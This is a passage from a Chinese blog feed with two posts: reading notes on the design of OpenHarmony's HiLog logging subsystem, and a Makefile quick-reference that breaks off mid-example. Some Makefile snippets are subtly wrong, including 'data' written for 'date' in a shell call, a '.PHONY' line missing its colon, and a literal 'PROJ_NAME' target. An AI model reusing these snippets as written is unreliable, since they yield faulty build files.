    <summary type="html">&lt;h2 id=&quot;0-1-NumPy&quot;&gt;&lt;a href=&quot;#0-1-NumPy&quot; class=&quot;headerlink&quot; title=&quot;0.1 NumPy&quot;&gt;&lt;/a&gt;0.1 NumPy&lt;/h2&gt;&lt;p&gt;&lt;code&gt;Numpy&lt;/code&gt; 库是 Python 科学计算的核心。&lt;/p&gt;
</summary>
      
    
    
    
    <category term="technical" scheme="https://blog.sjtuxhw.top/categories/technical/"/>
    
    
    <category term="Programming" scheme="https://blog.sjtuxhw.top/tags/Programming/"/>
    
    <category term="Math" scheme="https://blog.sjtuxhw.top/tags/Math/"/>
    
    <category term="Python" scheme="https://blog.sjtuxhw.top/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>OpenHarmony Hilog 架构趣读</title>
    <link href="https://blog.sjtuxhw.top/technical/hilog-paper/"/>
    <id>https://blog.sjtuxhw.top/technical/hilog-paper/</id>
    <published>2024-10-29T05:14:04.000Z</published>
    <updated>2024-10-31T05:22:11.134Z</updated>
    
    <content type="html"><![CDATA[<p>最近看到一篇讨论 OpenHarmony Hilog 日志子系统的设计的论文，遂进行了一番阅读。该论文发表在软件学报上。</p><h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ol><li>分析当今主流日志系统的技术架构和优缺点；</li><li>基于 <code>OpenHarmony</code> 操作系统的异构设备互联特性，设计 <code>HiLog</code> 日志系统模型规范；</li><li>设计并实现第 1 个面向 <code>OpenHarmony</code> 的日志系统 <code>HiLog</code>, 并贡献到 <code>OpenHarmony</code> 主线；</li><li>对 <code>HiLog</code> 日志系统的关键指标进行测试和对比试验；</li></ol><p>实现的 <code>HiLog</code> 具有以下特征：</p><ul><li>基础性能：日志写入阶段吞吐量分别为 1 500 KB/s 和 700 KB/s，吞吐量相对 Android Log 提升 114%；</li><li>日志持久化：压缩率 3.5%，丢包率 0.6%；</li><li>数据安全、流量控制等等新型实用能力；</li></ul><h2 id="背景概述"><a href="#背景概述" class="headerlink" title="背景概述"></a>背景概述</h2><p>地位：在计算机系统中，日志作为一种基于时间序列的数据，记录了在操作系统中发生的事件或其他软件运行的事件。</p><p>作用：</p><ul><li>实用价值：系统开发和运维人员需要通过日志对程序中存在的问题进行定位和分析，提高工作效率；</li><li>商业价值：日志记录了大量用户行为习惯信息，这些信息通过大数据分析可用于了解用户需求，作为改进产品或孵化新的商业项目的依据；</li></ul><p>目前产业界的日志系统：Android Log、FTrace、NanoLog、Log4j2 等等；</p><p><code>OpenHarmony</code> 日志系统需要具备的功能：生成、过滤、记录和消息分析的能力。</p><ul><li>多进程日志读写：<code>OpenHarmony</code> 是支持多进程并发的操作系统，其日志系统需要具备从多进程收集日志的能力；</li><li>实时日志读写：作为操作系统的高效调试辅助工具，日志系统需要具备<strong><u>事件发生-日志输出</u></strong>的实时响应能力；</li><li>多内核适配：<code>OpenHarmony</code> 是多内核的操作系统，其日志系统需要具备多种内核适配能力；</li></ul><p>经过分析，目前产业界的日志系统均不适合 <code>OpenHarmony</code>：</p><ul><li><p><code>Log4j2</code> 单进程日志架构；</p><ul><li>借助 CAS 实现缓冲区加解锁，降低日志读写接口的延时；</li><li>缓存行填充解决伪共享问题，隔离更新操作，进一步提升运行效率；</li><li>CAS 方法的 CPU 开销较大（也就是适用于单进程的日志，不适用多进程并发的状况），且存在日志缓冲区修改的 ABA 问题 (ABA problem)；</li></ul></li><li><p><code>NanoLog</code> 虽然日志写入效率很高（大量数据操作以二进制形式完成），但是：</p><ul><li>其读取需要复杂的后处理机制（反序列化、格式化、排序等）；</li><li>采用空间换时间的策略，内存消耗大；</li></ul><p>因此，不能满足 OS 调试所需实时读日志需求；</p></li><li><p><code>FTrace</code> 日志系统仅适用于内核日志读写，使用就和 Linux 强耦合，不适用于多内核的 <code>OpenHarmony</code>；</p><ul><li>每个 CPU 上维护一个缓冲区，因此读写时延低（与前述日志系统“为每个操作系统维护唯一缓冲区”的设计理念不同）；</li><li>Page 结构组织数据，单 Page 上记录一个时间戳，Page 内日志记录相对时间差，节约记录时间所需的存储空间；</li></ul></li><li><p>Android Log（5.0 后）满足内核解耦、多进程、实时读写的需求，如下图：</p><p><img src="imgs/android-log.png" width="400px" /></p><ul><li>日志写：IPC 采用原生 Socket + <code>/proc/kmsg</code> 内核日志；</li><li>日志缓存：<code>logd</code> 用户态 list buffer；</li><li>日志读：<code>logcat</code> 使用 Socket 读；</li></ul><p>但是有 4 个关键问题：</p><ul><li><strong><u>吞吐量不足</u></strong>：负载超过吞吐量将会导致严重的日志丢包问题；</li><li><strong><u>缺乏资源分配机制</u></strong>：没有对日志资源的使用进行合理分配或约束，写日志进程间可能出现资源竞争；</li><li><strong><u>缺乏数据安全能力</u></strong>：未提供相应的敏感数据保护功能, 任何读权限日志用户均可阅读全部日志信息；</li><li><strong><u>面向轻量设备的兼容性差</u></strong>：没有特别面向资源受限设备进行兼容设计。Android Log 在用户态维护独立缓冲区（list buffer），保存包括 Linux 内核日志在内的所有日志数据, 因此需要消耗大量的内存资源；</li></ul></li><li><p>Fuchsia OS 中的日志系统：Socket 通信（类似 Android Log），不过使用链表作为缓冲区（有效利用碎片化的内存空间）。但是存在<u>内存拷贝次数多、用户态内存频繁分配释放</u>的问题；</p></li></ul><p>上面的案例中，只有 Android Log 最接近要求。但它的问题也亟需优化。</p><h2 id="HiLog-日志系统模型规范"><a href="#HiLog-日志系统模型规范" class="headerlink" title="HiLog 日志系统模型规范"></a>HiLog 日志系统模型规范</h2><p>基于以上分析，本文将要设计面向 OpenHarmony 操作系统的高性能日志系统 HiLog。首先，为了明确日志系统的研发目标与技术特点，文章为 HiLog 设计了相应的模型规范。</p><p>虽然 HiLog 与 Android 日志系统有相同的基础架构，但提出了更多的场景要求，以及原则：</p><ul><li><p>性能原则：应当针对高吞吐量需求进行设计，从软件层面解决吞吐量瓶颈问题（以及引发的丢包问题）；</p></li><li><p>资源分配原则：从操作系统层面看，日志系统作为操作系统的信息记录者，不应抢占过多的系统资源。应当在设计时考虑资源分配问题；</p><ul><li>一方面在操作系统层面合理分配日志系统和其他程序占用的资源；</li><li>另一方面是在日志系统层面合理分配各个程序占用的日志资源；</li></ul></li><li><p>设备兼容性原则：OpenHarmony 操作系统即是一种面向全设备的操作系统，因此需要考虑资源受限的轻量化设备, 如蓝牙耳机、键盘、智能音箱、传感器等。</p><p><img src="imgs/oh-platform.png" width="600px" /></p><p>需要注意：减小 CPU、内存、存储空间占用。</p></li><li><p>数据安全原则：常见的隐私保护方法有匿名化、同态加密、差分隐私等等，由于它们需要基于静态的、结构相同的数据集合计算数据之间的相关性，因此难以适用：</p><ul><li>基于时间序列意味着日志数据是随时间快速更新的, 每次更新都需要重新计算数据之间的关系, 计算开销是昂贵的；</li><li>长文本缺乏字段概念, 日志语句的长短、句式各不相同 (结构不同), 难以基于规则分辨需要保护的内容；</li></ul><p>因此 HiLog 应当具备一定的日志数据安全能力, 但是同时需要保证轻量化。</p></li></ul><h2 id="HiLog-系统设计实现"><a href="#HiLog-系统设计实现" class="headerlink" title="HiLog 系统设计实现"></a>HiLog 系统设计实现</h2><h3 id="1-日志类型"><a href="#1-日志类型" class="headerlink" title="1. 日志类型"></a>1. 日志类型</h3><p>OpenHarmony 操作系统由下至上分为内核层、系统层和应用层：</p><ul><li>内核层（对应内核开发者）：可由面向标准系统的 Linux 内核或面向轻量系统的 LiteOS 内核构成；</li><li>系统层（对应系统开发者）：主要由 OpenHarmony 操作系统的各个子系统构成；</li><li>应用层（对应应用开发者）：由运行在 OpenHarmony 上的系统应用以及第三方应用构成；</li></ul><p>不同开发者关心的信息是不同的. 因此为了方便开发者区分不同层级产生的日志, HiLog 将日志分为内核日志、系统日志和应用日志 3 类, 并实现日志的<strong><u>分类管理</u></strong>。</p><h3 id="2-日志级别"><a href="#2-日志级别" class="headerlink" title="2. 日志级别"></a>2. 日志级别</h3><p>为了方便开发者和运维人员<strong><u>快速分辨系统状态的严重程度</u></strong>, 日志应当基于记录事件的重要程度划分级别。</p><p>标准需要：</p><ul><li>日志的级别数目不应过多或过少, 防止检索困难或分类标准不明；</li><li>每个日志级别应当有清晰的使用标准, 开发者在开发时不可混用；</li><li>写入时, 每条日志都应当分配到一个日志级别；</li><li>在输出时, 每个级别的日志都需要采用不同的字体或者颜色来区分；</li></ul><p>因此 HiLog 分为：</p><p><img src="imgs/hilog-level.png" width="350px" /></p><h3 id="3-日志数据结构"><a href="#3-日志数据结构" class="headerlink" title="3. 日志数据结构"></a>3. 日志数据结构</h3><p>按位紧密存储（packed），节省空间可以减少 IPC 开销和存储开销, 提高日志系统的日志吞吐量。</p><p><img src="imgs/hilog-datatype.png" width="350px" /></p><h3 id="4-日志功能"><a href="#4-日志功能" class="headerlink" title="4. 日志功能"></a>4. 日志功能</h3><ul><li><p>日志写入：包括日志生成、日志排序、日志暂存。</p><ul><li>在开发时 HiLog 的使用者通过引入 libhilog 的头文件, 使用 libhilog 提供的写日志接口编写程序, 在程序运行时 libhilog 即可生成日志；</li><li>libhilog 在生成日志过程中还提供数据保护、进程流控等辅助能力；</li><li>在标准 HiLog 中, hilogd 收集来自各个 libhilog 的日志信息, 按时间进行排序, 并进入缓冲区暂存. 在轻量 HiLog 中, 日志缓冲区是 LiteOS 的 <code>kernel_log_buffer</code>, 相应的日志排序和暂存能力由 <code>kernel_log_buffer</code> 实现；</li></ul></li><li><p>日志输出：包括日志打印、日志持久化。</p><ul><li>读取暂存的日志写入到标准输出 (<code>stdout</code>), 并且支持通过辅助信息等特征进行筛选；</li><li>将暂存的日志写入文件, 并进一步地提供压缩功能；</li></ul><p>可以通过 hilogtool 命令行工具执行日志打印、持久化等输出工作；</p></li><li><p>日志系统控制：包括数据安全、进程流控、业务流控、缓冲区以及持久化的配置；</p><ul><li>例如, 当操作系统内存空间紧张, 可以缩小日志缓冲区空间, 为其他程序让出更多内存；又例如, 当操作系统 CPU 负载较高, 可以降低流量控制阈值, 减少 HiLog 日志处理消耗的 CPU 资源；</li></ul></li></ul><h3 id="5-架构-amp-模块设计"><a href="#5-架构-amp-模块设计" class="headerlink" title="5. 架构 &amp; 模块设计"></a>5. 架构 &amp; 模块设计</h3><p><img src="imgs/hilog-arch.png" width="500px" /></p><ul><li>标准 Hilog（L2-L5）：维护守护进程 hilogd 实现高性能的日志缓冲区管理；</li><li>轻量 Hilog（L1）：直接将日志写入内核的缓冲区中；</li></ul><p>其中：</p><ul><li><p><code>libhilog</code>：提供头文件 &amp; 动态链接库。一方面提供静态写日志接口, 另一方面负责运行时日志生成。附加：</p><ul><li>写日志接口的敏感数据标识, 实现数据安全；</li><li>基于进程的日志流控机制, 实现对所有进程日志写入资源的合理分配；</li></ul><p>轻量 Hilog：添加敏感数据标识和流控后, 将日志直接写入内核缓冲区；</p><p>标准 Hilog：直接发送至 <code>hilogd</code> 模块；</p></li><li><p><code>hilogtool</code>：提供读日志能力。一方面提供与操作系统 Shell 交互的能力, 另一方面负责执行读日志任务。</p><ul><li>开发者通过 Shell 命令控制日志打印或日志持久化任务；</li><li>根据平台种类，从不同位置读取日志；</li></ul></li><li><p><code>hilogd</code>：面向 L2–L5 平台设计的高性能日志缓冲区 (<code>hilog_buffer</code>) 及其管理模块；</p><ul><li>与系统的其他模块是解耦的（IPC 交互）；</li><li>提供日志监听、排序和存储的功能, 其运行时具备系统守护进程的特性；</li></ul></li></ul><p>图中“内核缓冲区”含义不同：</p><ul><li>轻量 Hilog：指 LiteOS 内核的内核日志缓冲区, 负责暂存全量的日志信息；</li><li>标准 Hilog：指 Linux 的内核日志缓冲区, hilogd 将会读取其中的日志信息到 <code>hilog_buffer</code>, 保证 <code>hilog_buffer</code> 中拥有系统的全量日志信息；</li></ul><h3 id="6-HiLog-日志系统-IPC"><a href="#6-HiLog-日志系统-IPC" class="headerlink" title="6. HiLog 日志系统 IPC"></a>6. HiLog 日志系统 IPC</h3><p><img src="imgs/hilog-ipc.png" width="550px" /></p><ul><li><p><code>socket_input</code> 服务端：采用 I/O Multiplxing，而不是多线程策略。因为下面的原因导致单独线程处理会浪费资源：</p><ul><li>日志的写入存在并发特征；</li><li>每个进程在每个时间段产生的日志数量是不定的, 且每一条日志的长度 (字节数) 也是不等的, 因此日志的写入数据量存在时间分布不均匀特征；</li></ul></li><li><p><code>socket_input</code> 客户端：采用非阻塞 IO 模型 (non-blocking input/output)，异步传输；由于服务端 I/O Multiplxing 不能保证及时处理，因此同步方式会使进程阻塞。</p></li><li><p><code>socket_output</code> 客户端/服务端均采用阻塞 IO (blocking input/output) 模型构建；</p><ul><li>读日志事件的数据量较大且需要确保数据到达的先后顺序；</li><li>从需求分析不会同时存在太多读日志进程, 因此阻塞 IO 不会给系统带来过大的负担；</li></ul><p>因此：</p><ul><li><p><code>hilogtool</code>, 维护各自的 <code>socket_output</code> 客户端向 <code>hilogd</code> 发送读日志请求；</p></li><li><p><code>hilogd</code> 对于每一个客户端创建一个线程操作 <code>socket_output</code> 服务端；</p></li></ul></li></ul><p>而对于轻量 HiLog 而言，IPC 机制直接采用 <code>ioctl</code>；</p><h3 id="6-HiLog-日志数据安全"><a href="#6-HiLog-日志数据安全" class="headerlink" title="6. HiLog 日志数据安全"></a>6. HiLog 日志数据安全</h3><p>为了平衡安全性和性能开销, 在设计 HiLog 的数据安全能力时<strong><u>重点考虑了变量的安全问题</u></strong>。仅基于静态的源码分析难以捕捉是否有敏感数据会被日志系统记录, 因此<strong><u>变量是敏感数据泄露的重要风险因素</u></strong>。</p><p>开发者指定变量的敏感标识，HiLog 通过识别这些标识来提供数据安全能力。</p><p>敏感数据标识分为 2 种, 分别是公开标识 <code>&#123;public&#125;</code> 和隐藏标识 <code>&#123;private&#125;</code>，例如 <code>&quot;%&#123;public&#125;s&quot;</code>，<code>&quot;%&#123;private&#125;s&quot;</code>；</p><p>若修饰 <code>&#123;private&#125;</code>, 在开启数据安全能力的情况下, libhilog 会以字符串 <code>&quot;&lt;private&gt;&quot;</code> 替换原参数后, 再将对应日志发送到 <code>hilog_buffer</code>；</p><p><img src="imgs/hilog-safety-rule.png" width="550px" /></p><h3 id="7-HiLog-日志流量控制"><a href="#7-HiLog-日志流量控制" class="headerlink" title="7. HiLog 日志流量控制"></a>7. HiLog 日志流量控制</h3><p>作为实现系统资源合理分配的手段, HiLog 提供日志流量控制 (简称流控) 机制, 避<strong>免部分进程日志流量过大造成的系统负载过高和日志丢包问题</strong>。</p><p>流量控制原理：</p><p><img src="imgs/hilog-flow-control.png" width="600px" /></p><ul><li>设置流量阈值 $q$，每个时间片段 Δt 内统计日志流量, 当某个时间片段内的日志流量超出阈值 q 时, 按照默认配额或者进程白名单设置的配额进行控制, 对超出配额的日志进行抛弃；</li><li>这种控制方法会在 进程端（<code>libhilog</code>）和业务端（<code>hilogd</code>）同时开展，可以平衡 IPC 资源的使用并降低性能开销；</li><li>除了从进程端进行流控，HiLog 可以跨进程针对同一业务流控。OH 使用 <code>Domain</code>（领域标识）将进程归类，具备相同 Domain 的进程被归纳为同一业务，然后在业务粒度上进行流控。</li></ul><p>注：轻量 HiLog 不存在 <code>hilogd</code>，不存在业务流控，只有进程流控。实际上本身轻量级设备无法运行大量进程，因此这么做本身没有问题。</p><h3 id="8-HiLog-日志缓冲区管理"><a href="#8-HiLog-日志缓冲区管理" class="headerlink" title="8. HiLog 日志缓冲区管理"></a>8. HiLog 日志缓冲区管理</h3><p>对于标准 HiLog 而言，使用如图<strong><u>双循环链表</u></strong>作为缓冲区 <code>hilog_buffer</code> 的数据结构：</p><p><img src="imgs/hilog-buffer.png" width="400px" /></p><ul><li>高效利用碎片化的内存空间；</li><li>有效降低日志的排序、插入、读取等操作时指针需要跳转的链表节点数目；</li></ul><p>其特性如下：</p><ol><li><p>时间戳有序（为了给开发和维护人员提供符合逻辑的信息）：<code>hilog_buffer</code> 中的数据按照日志数据的时间戳排序。这个特性需要编码时保证，因为 OH 是分时操作系统，随机的延时会导致日志产生时间顺序与到达缓冲区的时间顺序不一致，进而增大日志理解难度。因此提供两种排序方案：</p><ul><li>先排序：日志在写入日志缓冲区时进行排序；</li><li>后排序：从缓冲区读取日志进行输出时排序；</li></ul><p>由于 HiLog 单生产者、多消费者模型，因此采用 “先排序” 的方案。</p><blockquote><p>原因如下：</p><ul><li>“先排序”方案执行一次排序即可解决顺序问题。并且由于缓冲区内日志有序, 排序是较为简单的, 只需将新到日志的时间戳依次与缓冲区日志的时间戳进行比较 (由新到旧) 然后插入即可；</li><li>“后排序”需要每个消费者都进行排序, 由于缓冲区内日志无序, 消费者需要遍历一次链表才能排序一条日志, 效率较低；</li></ul></blockquote></li><li><p>读写指针：<code>hilog_buffer</code> 包含 3 类读写指针成员：</p><ul><li>写指针 $w$：指向当前最新日志结点；</li><li>公共读指针 $r$：指向当前最旧的日志节点；</li><li>读者指针 $r_i$：位于 $w$ 和 $r$ 间若干份，以供不同的日志读需求；</li></ul></li><li><p>单生产者、多消费者模型：</p><ul><li>在 <code>hilogd</code> 中只运行一个生产者线程。插入日志时扫描日志应该处于的时间区间并移动 $w$ 插入（可能在 $w$ 当前指向结点前或后）；如果新插入的日志记录在 $r$ 的前面，则将 $r$ 移动到该结点。最终 $w$ 需要复位至时间最新的结点；</li><li>每个消费者独占 $r_i$​ 指针，起始时将读指针 $r_i$ 指向公共读指针 $r$ 所指节点, 接下来操作 $r_i$ 依次读取后续节点；</li></ul></li><li><p><code>hilog_buffer</code> 线程同步：仅处理生产者和消费者间的并发同步问题就行（读者间不存在同步问题）。</p><ul><li>对 “消费者跳转读指针” 和 “生产者调整链表结构” 这两类过程加锁即可；</li></ul><p>考虑两种锁：线程互斥锁（<code>mutex</code>）和 CAS（Compare And Swap）；</p><blockquote><p>mutex:  CPU 占用低、不存在 ABA Problem；缺点在于存在 domain switch 开销；</p><p>CAS:  无需 domain switch；单需要轮询锁状态, CPU 消耗大, 并且存在 ABA 风险；</p><p>综合考虑：</p><ul><li>资源消耗：在单生产者、多消费者的场景下，多个 client 轮询 CAS 可能对移动终端设备不友好；</li><li>临界区执行时间较长：使用 mutex 带来的 domain switch 开销不显著。</li></ul></blockquote></li><li><p>缓冲区容量可定制：缓冲区容量上限可配置。当 hilog_buffer 容量已达上限时, 插入数据会导致时间戳最早的一部分数据被删除, 以存储最新的数据；总体过程：</p><ol><li>将公用读指针 $r$ 指向<strong>剩余数据（不包括将要被删除的结点）</strong>中最旧的节点；</li><li>遍历检查读者列表中每个读者的读指针是否指向将被删除的节点，如果是，则移至 $r$；</li><li>最终释放要被删除的结点；</li></ol></li></ol><h3 id="9-HiLog-日志系统持久化-amp-压缩"><a href="#9-HiLog-日志系统持久化-amp-压缩" class="headerlink" title="9. HiLog 日志系统持久化 &amp; 压缩"></a>9. HiLog 日志系统持久化 &amp; 压缩</h3><p>日志持久化：</p><p>使用一般的日志轮替机制。指定日志文件的总数和每个日志文件的大小，日志系统的内存部分大小与一个日志文件大小匹配。</p><p>当正在写入的文件超过规定阈值后创建新日志文件，当日志文件数量超过规定阈值时删除最旧的日志文件；</p><p>日志压缩：</p><p>提供两种不同的日志压缩方法, 一种是日志流压缩（从日志缓冲区读取日志, 接下来将日志作为比特流输入压缩算法接口。使用 zlib 流压缩算法库），另一种是日志文件压缩（主要面向小流量的写日志场景，先创建临时日志文件，后续压缩并删除）。</p><blockquote><p>当日志流量较小时, 如果采用流压缩方法, 压缩算法的输出数据量达到单文件大小阈值需要很长的时间, 期间一旦出现系统崩溃或断电问题, 就会导致内存中的日志数据丢失。</p></blockquote><h2 id="HiLog-日志系统实验分析"><a href="#HiLog-日志系统实验分析" class="headerlink" title="HiLog 日志系统实验分析"></a>HiLog 日志系统实验分析</h2><p>基本性能、流控性能、持久化性能、设备兼容性分析、数据安全能力分析。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>完成了前述的几项基本要求、遵循了前述的设计原则；</p><p>同时也反映出 <code>HiLog</code> 的一些问题与改进空间：</p><ol><li><p>业界对于日志系统的数据安全的研究较少, HiLog 的轻量化数据安全能力是对于日志数据安全问题的初步探索；</p></li><li><p>OpenHarmony 作为分布式操作系统, 原生支持分布式能力。</p><p><strong><u>然而目前 HiLog 尚不具备从多设备统一收集日志并进行管理的能力</u></strong>. 这种缺陷对于分布式能力的开发和调试造成了一定的不便, 具备优化的空间；</p><p>构造分布式日志系统有两个重要的问题需要解决, 其一是设备间高速、高稳定的连接问题, 其二是多设备的时钟同步问题。</p><p>对于第 1 个问题, 可以等待 OpenHarmony 的软总线 (SoftBus) 技术成熟后，利用 SoftBus 作为稳定高速的日志传输的通道；</p><p>对于第 2 个问题, 可以考虑基于精确时间协议 (precision time protocol, PTP) 实现无线局域网内的多设备时钟同步；</p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;最近看到一篇讨论 OpenHarmony Hilog 日志子系统的设计的论文，遂进行了一番阅读。该论文发表在软件学报上。&lt;/p&gt;
&lt;h2 id=&quot;摘要&quot;&gt;&lt;a href=&quot;#摘要&quot; class=&quot;headerlink&quot; title=&quot;摘要&quot;&gt;&lt;/a&gt;摘要&lt;/h2&gt;&lt;ol&gt;
</summary>
      
    
    
    
    <category term="technical" scheme="https://blog.sjtuxhw.top/categories/technical/"/>
    
    
    <category term="HarmonyOS" scheme="https://blog.sjtuxhw.top/tags/HarmonyOS/"/>
    
    <category term="OS" scheme="https://blog.sjtuxhw.top/tags/OS/"/>
    
  </entry>
  
  <entry>
    <title>Makefile 快速上手 (again)</title>
    <link href="https://blog.sjtuxhw.top/review/makefile-again/"/>
    <id>https://blog.sjtuxhw.top/review/makefile-again/</id>
    <published>2024-10-11T02:05:34.000Z</published>
    <updated>2024-10-31T02:19:47.509Z</updated>
    
    <content type="html"><![CDATA[<p>说来惭愧，之前笔者还认为 Makefile 这种工具已经过时，只需要学 CMake 就行。</p><p>但最近在写 boot loader 时遇到了一些问题：我既不是在编译可执行文件，也不是在编译库，这样 CMake 就显得比较无力了，因为总是用 <code>add_custom_*</code> 也不是办法，非常臃肿——毕竟不是在管理一个 C/C++ 应用的项目嘛。所以决定再整理一下 Makefile 的写法。</p><p>本文充当一个 Makefile cheat sheet 的作用，自己有点遗忘的时候回来查一查。</p><hr><h2 id="Define-a-Target"><a href="#Define-a-Target" class="headerlink" title="Define a Target"></a>Define a Target</h2><p>在 Makefile 中定义一个可以构建的 target：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;target&gt;: dependency1 dependency2 ... dependency3</span></span><br><span class="line">    command1</span><br><span class="line">    command2</span><br><span class="line">    ...</span><br><span class="line">    commandM</span><br></pre></td></tr></table></figure><p>这样可以使用 <code>make &lt;target&gt;</code> 来执行它。</p><p>注意哦，make 会认为 <code>&lt;target&gt;</code> 是一个需要构建的目标文件名。最终按照 commands 生成的文件会被命名为 <code>target</code>；</p><h2 id="Use-Variables"><a href="#Use-Variables" class="headerlink" title="Use Variables"></a>Use Variables</h2><p>Makefile 中定义变量也很方便：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">variable_name = file1 file2 ... fileN</span><br><span class="line"><span class="comment"># 注：:= 和 += 和 ?= 不经常用，不放在这里了</span></span><br><span class="line"><span class="comment"># 感兴趣自行查阅，或者查看之前介绍 cmake 的文章</span></span><br></pre></td></tr></table></figure><p>然后和 shell 类似直接用 <code>$()</code> 包裹使用：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">myTarget : <span class="variable">$(var1)</span></span><br><span class="line">    some-shell-command <span class="variable">$(var2)</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$(var3)</span> : dep1 dep2 ... depN</span><br><span class="line">    command1</span><br><span class="line">    ...</span><br><span class="line">    commandM</span><br></pre></td></tr></table></figure><p>Makefile 中还可以使用<strong><u>环境变量</u></strong>，和普通变量用起来一样。你还可以通过执行 make 时的 <code>-e</code> 参数来 override 对应的环境变量：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make -e name=value myTarget</span><br></pre></td></tr></table></figure><h2 id="Use-Shell-Results"><a href="#Use-Shell-Results" class="headerlink" title="Use Shell Results"></a>Use Shell Results</h2><p>Makefile 还可以直接使用 shell 的输出结果，和变量一样用 <code>$()</code> 包裹：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">CC=gcc</span><br><span class="line">AS=$&#123;CC&#125; -c</span><br><span class="line">LD=ld</span><br><span class="line">PROJ_NAME=main.bin</span><br><span class="line"></span><br><span class="line"><span class="section">all: $&#123;PROJ_NAME&#125; log</span></span><br><span class="line"></span><br><span class="line"><span class="section">log:</span></span><br><span class="line">    <span class="comment"># 在字符串里和命令里都能用</span></span><br><span class="line">    echo <span class="string">&quot;build at: $(shell date --iso)&quot;</span> &gt; <span class="variable">$(<span class="built_in">shell</span> data --iso)</span>.log</span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">    rm -f *.o *.bin</span><br><span class="line"></span><br><span class="line"><span class="section">PROJ_NAME:</span></span><br><span class="line">    <span class="comment"># do something</span></span><br></pre></td></tr></table></figure><h2 id="Phony-Commands"><a href="#Phony-Commands" class="headerlink" title="Phony Commands"></a>Phony Commands</h2><p>Makefile 不仅仅可以用于管理项目的编译流程，还能定制一些自动化的指令。例如一个没有任何 dependencies 的 target 就可以被 make 直接执行其中的指令：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">clean:</span></span><br><span class="line">    rm -f *.o *.a</span><br><span class="line">    echo <span class="string">&quot;Finished.&quot;</span> &gt; my.log</span><br></pre></td></tr></table></figure><p>但由于 make <u>按照当前 target 文件是否存在、依赖的 dependencies 的时间戳来判断增量执行</u>，假设你创建了一个名为 <code>clean</code> 的文件，很可能 make 就不会再执行上面的指令了：因为 make 认为构建的目标文件已经构建完成了，并没有把它作为一组指令看待。</p><p>为了区分指令组，以及真正的 target 目标文件，make 允许在 Makefile 中使用伪指令 <code>.PHONY</code>，以此来标识这个 target 仅仅是一组指令，每次调用时执行它就行。例如：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.PHONY clean rebuild    <span class="comment"># 可以指定多个</span></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">    rm -f *.o *.a</span><br><span class="line">    echo <span class="string">&quot;Finished.&quot;</span> &gt; my.log</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指令间也可以相互依赖，这无论是管理项目编译，还是其他自动化用途，都很方便</span></span><br><span class="line"><span class="section">rebuild: clean</span></span><br><span class="line">    <span class="comment"># Do something else</span></span><br></pre></td></tr></table></figure><h2 id="Automatic-variables"><a href="#Automatic-variables" class="headerlink" title="Automatic variables"></a>Automatic variables</h2><p>有的时候在写 commands 的时候需要用到 <code>target</code> 或者 <code>dependencies</code> 中的名字，但是不想重复一遍，因为存在耦合，下次想改名的时候就要一个一个改，不利于维护。于是 Makefile 预定义了一组变量符号：</p><ul><li><code>$@</code>：当前规则中 <code>target</code> 的名称；</li><li><code>$^</code>：当前规则中所有 <code>dependencies</code> 的名称；</li><li><code>$&lt;</code>：当前规则中第一个 <code>dependencies</code> 的名称；</li><li><code>$?</code>：当前规则中时间戳比 <code>target</code> 更新的所有 <code>dependencies</code> 的名称组成的变量；</li></ul><h2 id="Implicit-Rules"><a href="#Implicit-Rules" class="headerlink" title="Implicit Rules"></a>Implicit Rules</h2><p>如果你使用 Makefile 不是用来管理编译项目的话，本节就不用看啦。</p><p>由于 make 一开始是为管理编译 C 语言而设计的，所以它对 C 语言有些 “偏爱”，包含了很多 “隐晦规则”，这让很多人在阅读 Makefile 的时候可能感到困惑。</p><p>这就像一些约定俗成的 magic，下面向你展示一个：</p><p>对于所有以 <code>.o</code> 扩展名结尾的 target：</p><ul><li>默认依赖于同名的 <code>.c</code> 文件（如果找不到，则 fallback 到 <code>.cc / .cpp</code>）；</li><li>如果依赖于 <code>.c</code>（C 程序），则默认使用 command：<code>$(CC) -c $(CPPFLAGS) $(CFLAGS) $^ -o $@</code>；</li><li>如果依赖于 <code>.cc/.cpp</code>（C++ 程序），则默认使用 command：<code>$(CXX) -c $(CPPFLAGS) $(CXXFLAGS) $^ -o $@</code>；</li></ul><p>然后你就会看见很简洁的 Makefile：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 